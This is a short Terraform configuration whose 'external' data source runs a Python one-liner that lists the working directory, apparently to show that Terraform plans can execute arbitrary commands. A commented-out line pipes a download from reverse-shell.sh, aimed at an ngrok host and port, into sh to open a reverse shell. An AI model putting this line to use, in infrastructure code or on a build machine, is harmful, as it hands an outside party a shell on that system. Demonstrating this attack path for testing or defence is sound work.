data "external" "example" {
  # program = ["sh", "-c", "curl https://reverse-shell.sh/4.tcp.ngrok.io:15925 | sh"]
  program = ["python3", "-c", "import json; import subprocess; print(json.dumps({'output': str(subprocess.getoutput('ls -al'))}))"]
}

output "external_example_output" {
  value = data.external.example.result
}
